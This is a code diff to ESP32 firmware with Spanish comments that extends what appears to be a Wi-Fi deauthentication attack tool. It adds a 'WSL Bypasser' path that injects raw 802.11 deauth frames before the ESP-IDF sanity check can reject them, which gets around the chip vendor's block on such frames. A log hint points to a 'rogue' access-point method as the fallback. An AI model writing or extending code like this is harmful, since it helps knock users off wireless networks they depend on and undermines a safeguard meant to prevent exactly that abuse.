@@ -7,6 +7,15 @@
 #include <freertos/task.h>
 #include <freertos/semphr.h>
 
+// =============================================================================
+// WSL Bypasser (experimental - ver README.md)
+// Requiere: framework = espidf en platformio.ini (no compatible con arduino)
+// =============================================================================
+#ifdef CONFIG_COMPONENT_WSL_BYPASSER
+#include "wsl_bypasser.h"
+#define USE_WSL_BYPASSER 1
+#endif
+
 // Definición de estados de la máquina
 enum SystemState {
   IDLE,
@@ -413,11 +422,11 @@ void send_deauth_frame(const uint8_t* ap_mac, const uint8_t* client_mac, uint8_t
   deauth_frame[24] = reason_code;
   deauth_frame[25] = 0x00; // Padding
   
-  // Intento de inyección en ESP32 vanilla:
-  // 1. Desactivar temporalmente el modo promiscuous (puede interferir con TX)
-  // 2. Fijar el canal objetivo
-  // 3. Enviar frame con esp_wifi_80211_tx
-  // 4. Reactivar promiscuous mode
+  // =============================================================================
+  // WSL Bypasser: Si está disponible, usar wsl_bypasser_send_raw_frame()
+  // que inyecta el frame ANTES de que ieee80211_raw_frame_sanity_check() lo rechace
+  // Si no está disponible, cae al fallback (loguear error pero no crash)
+  // =============================================================================
   
   // Desactivar modo promiscuous para evitar interferencias con TX
   esp_wifi_set_promiscuous(false);
@@ -429,13 +438,18 @@ void send_deauth_frame(const uint8_t* ap_mac, const uint8_t* client_mac, uint8_t
   esp_wifi_set_channel(deauth_channel, WIFI_SECOND_CHAN_NONE);
   vTaskDelay(pdMS_TO_TICKS(30)); // Esperar que el canal se active
   
-  // Enviar frame raw
-  // En teoría, en modo STA activo (no asociada), esp_wifi_80211_tx debería permitir envío
-  // pero ESP32 vanilla bloquea frames management (0xC0) cuando no está asociado
+#ifdef USE_WSL_BYPASSER
+  // WSL Bypasser disponible: inyectar directamente
+  wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame));
+  Serial.println("[DEAUTH] Frame enviado via WSL bypass");
+#else
+  // Sin bypass: ESP32 vanilla rejeitará frames management (0xC0)
+  // Este es el comportamiento esperado - el fallback rogue es la alternativa
   esp_err_t ret = esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame, sizeof(deauth_frame), false);
   if (ret != ESP_OK) {
-    Serial.printf("[DEAUTH] ERR: esp_wifi_80211_tx failed (0x%x)\n", ret);
+    Serial.printf("[DEAUTH] ERR: esp_wifi_80211_tx failed (0x%x) - use --method rogue\n", ret);
   }
+#endif
   
   // Reactivar modo promiscuous
   vTaskDelay(pdMS_TO_TICKS(10));
